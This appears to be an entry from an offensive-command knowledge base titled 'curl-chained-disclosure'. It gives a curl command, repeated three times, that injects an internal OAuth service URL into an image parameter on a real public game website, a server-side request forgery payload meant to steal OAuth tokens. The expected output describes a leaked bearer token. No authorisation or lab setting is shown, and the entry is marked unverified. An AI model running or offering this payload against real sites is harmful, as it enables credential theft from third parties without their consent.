---
data: >-
  curl -X GET
  "https://www.rockstargames.com/bully/anniversaryedition?image=http://internal.oauth.service/token"
  -v
tags:
  - web-testing
  - disclosure
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:35.433Z'
id: a9231bba-f285-4b21-90e8-5ec8745eb805
verified: false
validated: true
submitted: true
---
# curl-chained-disclosure

## Command

```bash
curl -X GET "https://www.rockstargames.com/bully/anniversaryedition?image=http://internal.oauth.service/token" -v
```

## Description

This command performs a chained request to test for OAuth token disclosure by injecting an internal URL into the image parameter.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X GET` | Specifies HTTP method | Yes |
| `?image=...` | Internal URL payload | Yes |
| `-v` | Verbose mode | Yes |

## Examples

### Basic Usage

```bash
curl -X GET "https://www.rockstargames.com/bully/anniversaryedition?image=http://internal.oauth.service/token" -v
```

### Advanced Usage

```bash
curl -X GET "https://www.rockstargames.com/bully/anniversaryedition?image=http://internal.oauth.service/token" -D - -o /dev/null
```

## Expected Output

Response containing leaked OAuth token in headers or body, such as Authorization: Bearer eyJ...

## Related

- [[Related Procedure: Disclose OAuth Tokens via Chained Vulnerabilities]]
